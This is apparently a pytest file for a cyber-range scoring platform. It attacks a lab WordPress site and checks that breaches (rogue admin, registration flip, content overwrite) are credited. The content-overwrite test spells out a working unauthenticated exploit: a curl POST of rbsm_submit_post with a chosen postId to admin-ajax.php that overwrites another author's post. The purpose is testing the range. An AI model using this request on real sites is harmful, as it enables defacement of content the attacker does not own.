import re
import time
import uuid
from datetime import datetime, timedelta, timezone

import pytest
import requests

from conftest import PLATFORM_URL, TARGET_PUBLIC
from range import ATTACKER, run
from shared_sessions import corp_is_declared

CORP = "corp"
CORP_DB = "corp-db"
CORP_HOST = "Host: corp.com"
NONCE = re.compile(r'"nonce":"([a-f0-9]+)"')

def _target_post(session=None):
    out = run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        "SELECT ID,post_author,post_status,post_title,post_content,post_excerpt "
        "FROM wp_posts WHERE post_type='post' ORDER BY ID ASC LIMIT 1;",
    ], session=session).stdout
    post_id, author, status, title, content, excerpt = out.rstrip("\n").split("\t", 5)
    return {
        "ID": post_id,
        "post_author": author,
        "post_status": status,
        "post_title": title,
        "post_content": content,
        "post_excerpt": excerpt,
    }

def _row(post_id, session=None):
    out = run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        f"SELECT post_title,post_content,post_excerpt,post_status FROM wp_posts "
        f"WHERE ID={post_id};",
    ], session=session).stdout
    title, content, excerpt, status = out.rstrip("\n").split("\t", 3)
    return {
        "post_title": title,
        "post_content": content,
        "post_excerpt": excerpt,
        "post_status": status,
    }

def _nonce(session=None):
    page = run(ATTACKER, [
        "curl", "-s", "-H", CORP_HOST, "--max-time", "20",
        f"{TARGET_PUBLIC}/submit-a-story/",
    ], session=session).stdout
    found = NONCE.search(page)
    assert found, "no rbGlobalSubmissionSettings nonce on the live corp.com submission page; is corp-wp up?"
    return found.group(1)

def _overwrite_post(nonce, post_id, title, excerpt, content, session=None):
    return run(ATTACKER, [
        "curl", "-s", "--max-time", "20",
        "-H", CORP_HOST,
        "--data-urlencode", "action=rbsm_submit_post",
        "--data-urlencode", f"_nonce={nonce}",
        "--data-urlencode", "formId=1",
        "--data-urlencode", f"postId={post_id}",
        "--data-urlencode", f"title={title}",
        "--data-urlencode", f"excerpt={excerpt}",
        "--data-urlencode", f"content={content}",
        "--data-urlencode", "userName=Anonymous Contributor",
        "--data-urlencode", "userEmail=anon@example.com",
        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php",
    ], session=session).stdout.strip()

def _restore(original, session=None):
    run(CORP, [
        "wp", "--allow-root", "post", "update", original["ID"],
        f"--post_title={original['post_title']}",
        f"--post_excerpt={original['post_excerpt']}",
        f"--post_status={original['post_status']}",
    ], session=session)
    run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-e",
        "UPDATE wp_posts SET post_content=%s WHERE ID=%s" % (
            _sql_quote(original["post_content"]), original["ID"],
        ),
    ], session=session)
    for meta in ("rbsm_form_id", "rbsm_author_info"):
        run(CORP, ["wp", "--allow-root", "post", "meta", "delete", original["ID"], meta],
            session=session)

def _sql_quote(value):
    return "'" + value.replace("'", "\\'") + "'"


@pytest.fixture
def corp_stands(stack_is_up):
    corp_is_declared()


def _session():
    created = requests.post(
        f"{PLATFORM_URL}/api/sessions/", json={"scenario": "corp"}, timeout=600
    )
    assert created.status_code == 201, created.text
    return created.json()["id"]


def _close(session_id):
    requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/close/", json={}, timeout=120
    )


def _record_window(session_id, name, fired_at, done_at):
    window = {
        "case_id": f"{name}-{uuid.uuid4().hex[:8]}",
        "name": name,
        "malicious": True,
        "correlation": "marker",
        "started_at": (fired_at - timedelta(seconds=3)).isoformat(),
        "ended_at": (done_at + timedelta(seconds=3)).isoformat(),
    }
    recorded = requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/cases/", json=window, timeout=60
    )
    assert recorded.status_code == 201, recorded.text


def _observe(session_id):
    observed = requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=120
    ).json()
    assert observed["total"] == 3, observed
    return observed


def _credited_keys(session_id):
    listed = requests.get(
        f"{PLATFORM_URL}/api/sessions/{session_id}/objectives/", timeout=60
    ).json()
    return {o["key"] for o in listed}


def _score(session_id):
    return requests.get(
        f"{PLATFORM_URL}/api/sessions/{session_id}/score/", timeout=60
    ).json()


def test_a_live_rogue_admin_is_credited_from_the_targets_own_row_with_no_signature(
    corp_stands, rogue_admin_session
):
    seen = rogue_admin_session
    assert seen["admins_left"] == seen["baseline"], (
        f"left corp-db dirty: admins now {sorted(seen['admins_left'])}, "
        f"baseline {sorted(seen['baseline'])}"
    )
    assert seen["code"] == "302", f"the rogue-admin registration did not complete, got {seen['code']!r}"
    assert seen["created"] and all(uid > 1 for uid in seen["created"]), (
        f"no non-baseline administrator was committed; admins {sorted(seen['admins'])}"
    )
    assert seen["observed"]["total"] == 3, seen["observed"]

    assert "corp-rogue-admin" in seen["credited"]

    score = seen["score"]
    breach = next((b for b in score["breaches"] if b["key"] == "corp-rogue-admin"), None)
    assert breach is not None, score["breaches"]
    assert breach["detected"] is False, breach
    assert breach["detection_ids"] == [], breach
    assert score["objectives"]["objectives"] >= 1, score["objectives"]


def test_a_live_option_flip_is_credited_from_the_targets_own_row(corp_stands, option_flip_session):
    seen = option_flip_session
    assert seen["options_left"] == ("0", "subscriber"), seen["options_left"]
    assert seen["flips"] == ("200", "200"), seen["flips"]
    assert seen["registration_open"] == "1"
    assert seen["observed"]["total"] == 3, seen["observed"]

    assert "corp-self-registration" in seen["credited"]
    assert "corp-self-registration" in {b["key"] for b in seen["score"]["breaches"]}, seen["score"]["breaches"]


def test_a_live_content_overwrite_is_credited_from_the_targets_own_row(corp_stands):
    session_id = _session()
    original = _target_post(session_id)
    title = "Defaced by an unauthenticated guest"
    excerpt = "overwritten without owning this post"
    body = "overwritten without owning this post via rbsm_submit_post postId overwrite"
    try:
        time.sleep(2)
        fired_at = datetime.now(timezone.utc)
        response = _overwrite_post(
            _nonce(session_id), original["ID"], title, excerpt, body, session_id
        )
        assert '"success":true' in response, f"the postId overwrite was refused: {response!r}"
        after = _row(original["ID"], session_id)
        assert after["post_title"] == title and after["post_content"] == body, after
        done_at = datetime.now(timezone.utc)

        _record_window(session_id, "corp-content-write", fired_at, done_at)
        _observe(session_id)

        assert "corp-content-overwrite" in _credited_keys(session_id)

        score = _score(session_id)
        assert "corp-content-overwrite" in {b["key"] for b in score["breaches"]}, score["breaches"]
    finally:
        _restore(original, session_id)
        restored = _row(original["ID"], session_id)
        _close(session_id)
        assert restored == {
            "post_title": original["post_title"],
            "post_content": original["post_content"],
            "post_excerpt": original["post_excerpt"],
            "post_status": original["post_status"],
        }, restored
